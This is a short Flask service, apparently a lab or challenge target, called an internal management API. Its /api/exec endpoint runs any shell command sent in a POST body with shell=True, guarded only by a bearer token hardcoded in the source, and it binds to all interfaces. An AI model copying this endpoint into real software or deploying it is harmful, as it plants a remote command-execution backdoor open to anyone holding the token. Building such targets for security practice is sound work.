from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)
TOKEN = 's3cr3t_m3d1um_t0k3n_9918'

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'service': 'internal_management_api'})

@app.route('/api/exec', methods=['POST'])
def execute():
    auth = request.headers.get('Authorization', '')
    if auth != f'Bearer {TOKEN}':
        return jsonify({'error': 'Unauthorized'}), 401
    
    cmd = request.json.get('cmd', '') if request.is_json else ''
    if not cmd:
        return jsonify({'error': 'No cmd provided'}), 400
    
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=5)
        return jsonify({'output': out})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
